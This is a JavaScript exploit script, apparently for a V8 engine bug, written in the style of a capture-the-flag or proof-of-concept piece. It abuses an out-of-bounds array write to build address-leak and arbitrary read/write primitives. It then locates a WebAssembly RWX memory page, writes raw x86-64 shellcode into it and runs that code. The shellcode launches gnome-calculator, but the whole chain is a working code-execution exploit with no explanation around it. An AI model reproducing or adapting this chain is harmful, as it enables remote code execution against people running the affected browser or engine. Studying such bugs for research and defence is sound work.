class Memory{
    constructor(){
        this.buf = new ArrayBuffer(8);
        this.u32 = new Uint32Array(this.buf);
        this.f64 = new Float64Array(this.buf);
    }
    u2f(val){
        let tmp = [];
        tmp[0] = parseInt(val % 0x100000000);
        tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
        this.u32.set(tmp);
        return this.f64[0];
    }
    f2u(val){
        this.f64[0] = val;
        let tmp = Array.from(this.u32);
        return tmp[0] + tmp[1] * 0x100000000;
    }
}
mem = new Memory();

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,116,101,115,116,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,32,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.test;

const oob_arr = [1.1, 1.2, 1.3];
const oob_fun = [1.1, 1.2, 1.3];
oob_arr.pop();
oob_arr.push(1.4);
let vicbuf = new ArrayBuffer(200);
var vicobj = {marker: 'aaaaaa', obj:{}};


a_addr = mem.f2u(oob_arr[4]);
console.log("0x"+ a_addr.toString(16));

oob_arr[4] = mem.u2f(0x10000000000 + a_addr);

leak_heap = mem.f2u(oob_arr[15]);
console.log("0x" + leak_heap.toString(16));



class ARW{
    constructor(buf_offset, obj_offset){
        this.buf_offset = buf_offset;
        this.obj_offset = obj_offset;
    }
    read(addr){
        oob_arr[this.buf_offset] = mem.u2f(addr);
        let tmp = new Float64Array(vicbuf,0, 8);
        return mem.f2u(tmp[0]);
    }
    write(addr, data){
        oob_arr[this.buf_offset] = mem.u2f(addr);
        let tmp = new Float64Array(vicbuf, 0, 8);
        tmp.set([mem.u2f(data)])
    }
    addrof(one_obj){
        vicobj.obj = one_obj;
        return (mem.f2u(oob_arr[this.obj_offset]) - (mem.f2u(oob_arr[this.obj_offset]) & 0xffffffff)) / 0x100000000;
    }
    writebuf(addr, data){
        oob_arr[this.buf_offset] = mem.u2f(addr);
        let u8 = new Uint8Array(vicbuf);
        for (let i = 0 ; i < data.length; i++){
            u8[i] = data[i];
        }
    }
}


function leakhigh(addr){
    oob_arr[10] = mem.u2f(0x10000000000 + addr - 8);
    return (mem.f2u(oob_fun[0]) - (mem.f2u(oob_fun[0]) & 0xffffffff)) / 0x100000000;
}
function leaklow(addr){
    oob_arr[10] = mem.u2f(0x10000000000 + addr - 8);
    return mem.f2u(oob_fun[0]) & 0xffffffff;
}
function leak(addr){
    oob_arr[10] = mem.u2f(0x10000000000 + addr - 8);
    return mem.f2u(oob_fun[0]);
}
//
//
//
arw = new ARW(15,21);
//
f_addr = arw.addrof(f);
console.log("0x" + f_addr.toString(16));
//
shared_info_addr =  leakhigh(f_addr + 8);
console.log("shared_info_addr: 0x" + shared_info_addr.toString(16));
WasmExportedFunctionData = leakhigh(shared_info_addr);
console.log("WasmExportedFunctionData: 0x" + WasmExportedFunctionData.toString(16));
instance_addr = leaklow(WasmExportedFunctionData+8);
console.log("instance_addr: 0x" + instance_addr.toString(16));
rwxmap = leak(instance_addr+0x68);
console.log("rwx_addr: 0x" + rwxmap.toString(16));
let calc = [0xe8, 0x00, 0x00, 0x00, 0x00, 0x41, 0x59, 0x49, 0x81, 0xe9, 0x05, 0x00, 0x00, 0x00, 0xb8, 0x01, 0x01, 0x00, 0x00, 0xbf, 0x6b, 0x00, 0x00, 0x00, 0x49, 0x8d, 0xb1, 0x61, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x20, 0x00, 0x0f, 0x05, 0x48, 0x89, 0xc7, 0xb8, 0x51, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x49, 0x8d, 0xb9, 0x62, 0x00, 0x00, 0x00, 0xb8, 0xa1, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3b, 0x00, 0x00, 0x00, 0x49, 0x8d, 0xb9, 0x64, 0x00, 0x00, 0x00, 0x6a, 0x00, 0x57, 0x48, 0x89, 0xe6, 0x49, 0x8d, 0x91, 0x7e, 0x00, 0x00, 0x00, 0x6a, 0x00, 0x52, 0x48, 0x89, 0xe2, 0x0f, 0x05, 0xeb, 0xfe, 0x2e, 0x2e, 0x00, 0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x67, 0x6e, 0x6f, 0x6d, 0x65, 0x2d, 0x63, 0x61, 0x6c, 0x63, 0x75, 0x6c, 0x61, 0x74, 0x6f, 0x72, 0x00, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 0x59, 0x3d, 0x3a, 0x30, 0x00];

arw.writebuf(rwxmap, calc);

f();




